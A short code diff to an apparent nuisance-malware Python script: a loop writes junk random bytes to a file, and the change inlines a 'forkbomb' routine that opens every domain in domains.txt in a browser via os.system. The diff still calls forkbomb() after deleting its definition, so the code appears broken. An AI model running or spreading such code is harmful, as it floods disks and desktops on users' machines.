@@ -17,10 +17,8 @@ while mal == True:
       file.write(malwar + str(random.randbytes(999)))
     print(malwar)
     forkbomb()
-
-def forkbomb():
-  file = open("domains.txt", "r")
-  content = file.readlines()
-  for line in content:
-    time.sleep(5)
-    os.system("xdg-open https://" + line)
+    file = open("domains.txt", "r")
+    content = file.readlines()
+    for line in content:
+        time.sleep(5)
+        os.system("xdg-open https://" + line)
